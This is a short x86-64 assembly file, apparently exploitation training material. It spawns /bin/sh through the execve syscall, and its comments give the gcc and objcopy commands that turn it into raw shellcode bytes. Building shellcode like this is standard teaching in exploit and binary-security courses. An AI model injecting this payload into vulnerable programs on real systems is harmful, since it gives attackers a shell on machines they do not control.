# Compile: gcc -nostdlib -static shell.s -o shell.elf
# Extract Text: objcopy --dump-section .text=shell shell.elf
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59          # syscall number of execve
    lea rdi, [rip+binsh] # points to first argument of execve at the /bin/sh string below
    mov rsi, 0           # argv = NULL
    mov rdx, 0           # envp = NULL
    syscall              # triggers the system call
binsh:                   # label marking /bin/sh string
    .string "/bin/sh"
